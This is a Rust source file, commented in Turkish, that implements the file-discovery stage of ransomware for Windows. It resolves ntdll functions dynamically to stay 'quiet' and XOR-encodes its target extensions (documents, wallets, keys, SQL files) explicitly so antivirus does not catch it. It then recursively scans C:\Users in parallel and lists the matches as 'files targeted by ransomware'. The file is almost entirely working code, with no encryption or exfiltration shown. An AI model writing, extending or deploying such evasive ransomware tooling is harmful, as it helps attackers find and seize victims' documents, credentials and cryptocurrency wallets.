use rayon::prelude::*; // paralel tarama kütüphanesi
use std::ffi::{c_void, CString}; // bellek ve yazı dönüşümü
use std::ptr; // boş pointerlar
use std::os::windows::ffi::OsStrExt; // windows yazı desteği
use std::ffi::OsStr; // ham yazı işlemleri
use std::sync::mpsc; // kanal yapısı
use std::thread; // thread yönetimi

type NTSTATUS = i32; // windows hata tipi

// ntdll fonksiyon kalıplarını tanımlıyoruz
type NtOpenFileFn = unsafe extern "system" fn(*mut *mut c_void, u32, *mut OBJECT_ATTRIBUTES, *mut IO_STATUS_BLOCK, u32, u32) -> NTSTATUS;
type NtQueryDirectoryFileFn = unsafe extern "system" fn(*mut c_void, *mut c_void, *mut c_void, *mut c_void, *mut IO_STATUS_BLOCK, *mut c_void, u32, u32, u8, *mut UNICODE_STRING, u8) -> NTSTATUS;
type NtCloseFn = unsafe extern "system" fn(*mut c_void) -> NTSTATUS;

// bulunan fonksiyonları tutan yapı
struct NtFunctions {
    open_file: NtOpenFileFn,
    query_dir: NtQueryDirectoryFileFn,
    close_handle: NtCloseFn,
}

// her thread için ayrı 64kb bellek (reusable buffer)
thread_local! {
    static THREAD_BUFFER: std::cell::RefCell<Vec<u8>> = std::cell::RefCell::new(vec![0u8; 65536]);
}

const STATUS_SUCCESS: NTSTATUS = 0x00000000;
const STATUS_NO_MORE_FILES: NTSTATUS = 0x80000006_u32 as i32;

// ntapi bayrakları
const FILE_LIST_DIRECTORY: u32 = 0x0001;
const SYNCHRONIZE: u32 = 0x00100000;
const FILE_SHARE_READ: u32 = 0x00000001;
const FILE_SHARE_WRITE: u32 = 0x00000002;
const FILE_DIRECTORY_FILE: u32 = 0x00000001;
const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
const FILE_ATTRIBUTE_DIRECTORY: u32 = 0x00000010;

pub enum LogMesaji {
    Bulundu(String, thread::ThreadId),
    ErisimEngeli(String, NTSTATUS),
}

// ntdll içindeki fonksiyonları çalışma anında bulur (en sessiz yöntem)
unsafe fn resolve_nt_functions() -> Option<NtFunctions> {
    unsafe extern "system" {
        fn GetModuleHandleA(lpModuleName: *const i8) -> *mut c_void;
        fn GetProcAddress(hModule: *mut c_void, lpProcName: *const i8) -> *mut c_void;
    }

    let ntdll_name = CString::new("ntdll.dll").ok()?;
    let h_ntdll = unsafe { GetModuleHandleA(ntdll_name.as_ptr()) };
    if h_ntdll.is_null() { return None; }

    let open_ptr = unsafe { GetProcAddress(h_ntdll, CString::new("NtOpenFile").ok()?.as_ptr()) };
    let query_ptr = unsafe { GetProcAddress(h_ntdll, CString::new("NtQueryDirectoryFile").ok()?.as_ptr()) };
    let close_ptr = unsafe { GetProcAddress(h_ntdll, CString::new("NtClose").ok()?.as_ptr()) };

    if open_ptr.is_null() || query_ptr.is_null() || close_ptr.is_null() { return None; }

    Some(NtFunctions {
        open_file: unsafe { std::mem::transmute(open_ptr) },
        query_dir: unsafe { std::mem::transmute(query_ptr) },
        close_handle: unsafe { std::mem::transmute(close_ptr) },
    })
}

// xor ile gizlenmiş uzantıları çözer
fn xor_decrypt(data: &[u8]) -> String {
    let key = 0x55;
    data.iter().map(|&b| (b ^ key) as char).collect()
}

// av yakalamasın diye xorlu uzantı listesi
fn get_target_extensions() -> Vec<String> {
    let encrypted = vec![
        vec![0x7b, 0x21, 0x3d, 0x21], // .txt
        vec![0x7b, 0x25, 0x31, 0x33], // .pdf
        vec![0x7b, 0x31, 0x3a, 0x36, 0x2d], // .docx
        vec![0x7b, 0x22, 0x34, 0x39, 0x39, 0x30, 0x21], // .wallet
        vec![0x7b, 0x3e, 0x30, 0x2c], // .key
        vec![0x7b, 0x26, 0x24, 0x39], // .sql
    ];
    encrypted.into_iter().map(|d| xor_decrypt(&d)).collect()
}

#[repr(C)]
pub struct UNICODE_STRING {
    pub length: u16,
    pub maximum_length: u16,
    pub buffer: *mut u16,
}

#[repr(C)]
pub struct OBJECT_ATTRIBUTES {
    pub length: u32,
    pub root_directory: *mut c_void,
    pub object_name: *mut UNICODE_STRING,
    pub attributes: u32,
    pub security_descriptor: *mut c_void,
    pub security_quality_of_service: *mut c_void,
}

#[repr(C)]
pub struct IO_STATUS_BLOCK {
    pub status: NTSTATUS,
    pub information: usize,
}

#[repr(C)]
pub struct FILE_DIRECTORY_INFORMATION {
    pub next_entry_offset: u32,
    pub file_index: u32,
    pub creation_time: i64,
    pub last_access_time: i64,
    pub last_write_time: i64,
    pub change_time: i64,
    pub end_of_file: i64,
    pub allocation_size: i64,
    pub file_attributes: u32,
    pub file_name_length: u32,
    pub file_name: [u16; 1],
}

fn to_nt_path(path: &str) -> String {
    if path.starts_with("\\??\\") { path.to_string() }
    else { format!("\\??\\{}", path) }
}

// ana tarama fonksiyonu ntfns yapısını kullanıyor
fn scan_directory_parallel(path: &str, current_depth: u32, tx: mpsc::Sender<LogMesaji>, ntfns: &NtFunctions) {
    if current_depth > 9 { return; }

    // beyaz liste kontrolü sistem yerlerine girme diyoruz
    let path_lower = path.to_lowercase();
    if path_lower.contains("c:\\windows") || path_lower.contains("c:\\program files") || 
       path_lower.contains("boot") || path_lower.contains("$recycle.bin") {
        return;
    }

    let nt_path = to_nt_path(path);
    let os_str = OsStr::new(&nt_path);
    let mut wide_path: Vec<u16> = os_str.encode_wide().collect();
    
    let mut us = UNICODE_STRING {
        length: (wide_path.len() * 2) as u16,
        maximum_length: (wide_path.len() * 2) as u16,
        buffer: wide_path.as_mut_ptr(),
    };

    let mut obj_attr = OBJECT_ATTRIBUTES {
        length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
        root_directory: ptr::null_mut(),
        object_name: &mut us,
        attributes: 0x00000040,
        security_descriptor: ptr::null_mut(),
        security_quality_of_service: ptr::null_mut(),
    };

    let mut handle: *mut c_void = ptr::null_mut();
    let mut io_status = IO_STATUS_BLOCK { status: 0, information: 0 };

    unsafe {
        // dinamik yüklü fonksiyonu çağırıyoruz
        let status = (ntfns.open_file)(
            &mut handle,
            FILE_LIST_DIRECTORY | SYNCHRONIZE,
            &mut obj_attr,
            &mut io_status,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
        );

        if status != STATUS_SUCCESS {
            let _ = tx.send(LogMesaji::ErisimEngeli(path.to_string(), status));
            return;
        }
    }

    let mut found_subdirs = Vec::new();
    let target_exts = get_target_extensions();

    unsafe {
        THREAD_BUFFER.with(|buf_cell| {
            let mut buffer = buf_cell.borrow_mut();
            
            loop {
                let status = (ntfns.query_dir)(
                    handle, ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
                    &mut io_status, buffer.as_mut_ptr() as *mut c_void, buffer.len() as u32,
                    1, 0, ptr::null_mut(), 0,
                );

                if status == STATUS_NO_MORE_FILES { break; }
                else if status != STATUS_SUCCESS {
                    let _ = tx.send(LogMesaji::ErisimEngeli(path.to_string(), status));
                    break;
                }

                let mut current_ptr = buffer.as_ptr();
                loop {
                    let info = &*(current_ptr as *const FILE_DIRECTORY_INFORMATION);
                    let name_len = (info.file_name_length / 2) as usize;
                    let name_slice = std::slice::from_raw_parts(info.file_name.as_ptr(), name_len);
                    let file_name = String::from_utf16_lossy(name_slice);

                    if file_name != "." && file_name != ".." {
                        let mut full_path = String::from(path);
                        if !full_path.ends_with('\\') { full_path.push('\\'); }
                        full_path.push_str(&file_name);

                        if (info.file_attributes & FILE_ATTRIBUTE_DIRECTORY) != 0 {
                            found_subdirs.push(full_path);
                        } else {
                            let file_name_lower = file_name.to_lowercase();
                            if target_exts.iter().any(|ext| file_name_lower.ends_with(ext)) {
                                let _ = tx.send(LogMesaji::Bulundu(full_path, thread::current().id()));
                            }
                        }
                    }

                    if info.next_entry_offset == 0 { break; }
                    current_ptr = current_ptr.offset(info.next_entry_offset as isize);
                }
            }
        });

        (ntfns.close_handle)(handle); // handle kapatma
    }

    found_subdirs.into_par_iter().for_each(|sub_dir| {
        scan_directory_parallel(&sub_dir, current_depth + 1, tx.clone(), ntfns);
    });
}

fn main() {
    println!("ntapi dinamik ve sessiz tarama basliyor");
    
    let ntfns = unsafe {
        match resolve_nt_functions() {
            Some(f) => f,
            None => { println!("ntapi yuklenemedi"); return; }
        }
    };
    
    let root_path = "C:\\Users"; 
    let (tx, rx) = mpsc::channel();
    
    scan_directory_parallel(root_path, 0, tx.clone(), &ntfns);
    drop(tx);

    let mut bulunanlar = Vec::new();
    let mut engeller = Vec::new();

    for mesaj in rx {
        match mesaj {
            LogMesaji::Bulundu(yol, t_id) => bulunanlar.push((yol, t_id)),
            LogMesaji::ErisimEngeli(yol, kod) => engeller.push((yol, kod)),
        }
    }

    println!("\n--- ransomware hedefindeki dosyalar ---");
    for (y, t) in &bulunanlar { println!("[Thread {:?}] {}", t, y); }

    println!("\n--- girilemeyen yerler ---");
    for (y, k) in &engeller { println!("ENGEL: {} KOD: {:#X}", y, k); }

    println!("\ntarama bitti hedef: {} engel: {}", bulunanlar.len(), engeller.len());
}